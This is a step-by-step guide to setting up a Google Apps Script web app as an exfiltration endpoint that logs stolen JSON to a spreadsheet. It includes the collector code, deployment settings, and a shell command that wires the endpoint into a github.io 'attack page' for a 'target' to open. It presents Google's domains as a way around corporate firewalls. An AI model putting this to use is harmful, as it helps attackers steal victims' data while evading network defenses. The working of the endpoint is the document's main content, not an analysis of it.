# Google Apps Script Exfiltration Endpoint

Corporate firewalls block webhook.site. Google Apps Script endpoints (`script.google.com`)
are NEVER blocked because they're on Google's infrastructure.

## Setup (2 minutes)

### Step 1: Create the Apps Script

1. Go to https://script.google.com
2. Click **New Project**
3. Delete everything in the editor
4. Paste this code:

```javascript
function doPost(e) {
  try {
    var sheet = SpreadsheetApp.openById(SHEET_ID).getActiveSheet();
    var data = e.parameter.data || e.postData.contents || "no data";
    var timestamp = new Date().toISOString();
    var sourceIp = e.parameter.ip || "unknown";
    sheet.appendRow([timestamp, sourceIp, data]);
    return ContentService.createTextOutput("ok").setMimeType(ContentService.MimeType.TEXT);
  } catch(err) {
    return ContentService.createTextOutput("error: " + err).setMimeType(ContentService.MimeType.TEXT);
  }
}

function doGet(e) {
  return doPost(e);
}
```

### Step 2: Create a Google Sheet to receive data

1. Go to https://sheets.google.com
2. Create a new blank spreadsheet
3. Name it "Exfiltrated Data"
4. Copy the spreadsheet ID from the URL:
   `https://docs.google.com/spreadsheets/d/THIS_IS_THE_ID/edit`
5. In the Apps Script editor, replace `SHEET_ID` with your actual ID:
   ```javascript
   var sheet = SpreadsheetApp.openById("1BxiMVs0XR...your_id_here...");
   ```

### Step 3: Deploy as Web App

1. In the Apps Script editor, click **Deploy** > **New deployment**
2. Click the gear icon, select **Web app**
3. Set:
   - **Execute as**: Me
   - **Who has access**: Anyone
4. Click **Deploy**
5. **Authorize** when prompted (click through the "unsafe" warning)
6. Copy the **Web app URL** — it looks like:
   `https://script.google.com/macros/s/AKfycbx.../exec`

### Step 4: Configure the attack page

Run this from your terminal:

```bash
cd ~/prompt_security_poc/github_demo
# Replace with YOUR Apps Script URL:
GOOGLE_URL="https://script.google.com/macros/s/YOUR_ID/exec"
sed -i '' "s|const EXFIL_GOOGLE = \"\";|const EXFIL_GOOGLE = \"${GOOGLE_URL}\";|" index.html
git add index.html && git commit -m "Add Google Apps Script exfil endpoint" && git push origin main
```

### Step 5: Test

1. Open your Google Sheet
2. Have the target open the github.io attack page
3. The exfiltrated JSON will appear as a new row in the sheet
4. The `data` column contains the full JSON — paste it into https://jsonformatter.org to view

## Why this works through corporate firewalls

- Endpoint is on `script.google.com` / `script.googleusercontent.com`
- These domains are whitelisted by EVERY corporate firewall (needed for Google Workspace)
- The form POST goes to Google's infrastructure, not a known webhook service
- The data is stored in YOUR Google Sheet, not a third-party service
